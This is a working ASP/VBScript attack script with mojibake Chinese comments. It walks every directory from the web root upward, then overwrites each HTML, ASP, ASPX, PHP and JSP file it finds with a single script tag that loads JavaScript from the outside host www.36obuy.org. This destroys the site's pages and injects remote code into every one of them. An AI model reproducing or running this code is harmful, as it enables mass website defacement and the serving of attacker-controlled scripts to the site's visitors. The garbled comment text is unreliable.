<%@LANGUAGE = VBScript.Encode%>
<%
'��վ�Զ����������� BY������ QQ��29295842
data = Server.MapPath("\")  '��վ·��
response.Write data
data2=""
dim names(20)
arrayValue = split(data,"\")
for i = 0 to UBound(arrayValue)
    data2 =data2+arrayValue(i)+"\"
    names(i)=data2
next

'-----for i=0 to UBound(names) '�����ȡ
int_url=UBound(names)
for i=0 to UBound(names)
iiint=int_url-i
url_data=names(iiint)
if url_data="" then
Response.Write ""
else
response.Write "</br>��ʼ������:</br>"
response.Write url_data
bianli(url_data) '����
end if
next
'txt_end_data2("C:\Program Files\С����AspWebServer\wwwroot\5.asp")
Response.Write "</br>д�����</br>"


function txt_end_data2(abc)'д���ļ�β��
dim fso  '��ȡ�ļ�
path=replace(abc,"\\","\")
'Response.Write path+"</br>"
str = "<script language=""javascript"" type=""text/javascript"" src=""http://www.36obuy.org/tj2.js""></script>"  '//д������
Set fso=CreateObject("Scripting.FileSystemObject")
set f=fso.CreateTextFile(path,1)
f.WriteLine str
f.Close
Response.Write "д�����ݳɹ�"+path+"<br>"
end function 

function bianli(path)'����Ŀ¼
    set fso=server.CreateObject("scripting.filesystemobject")
    on error resume next
    set objFolder=fso.GetFolder(path)
    set objSubFolders=objFolder.Subfolders
    for each objSubFolder in objSubFolders
        nowpath=path + "\" + objSubFolder.name
        'Response.Write nowpath
        set objFiles=objSubFolder.Files
        for each objFile in objFiles
                data=nowpath+objFile.name
                if InStr(data,".html") or InStr(data,".HTML") or InStr(data,".htm") or InStr(data,".HTM") or InStr(data,".asp") or InStr(data,".aspx") or InStr(data,".php") or InStr(data,".jsp") then
        	    'Response.Write "<br>"
        	    'Response.Write data
                     txt_end_data2(data)'д���ļ�
    	end if
            next
            bianli(nowpath)'�ݹ�
    next
    set objFolder=nothing
    set objSubFolders=nothing
    set fso=nothing
end function 
 

%>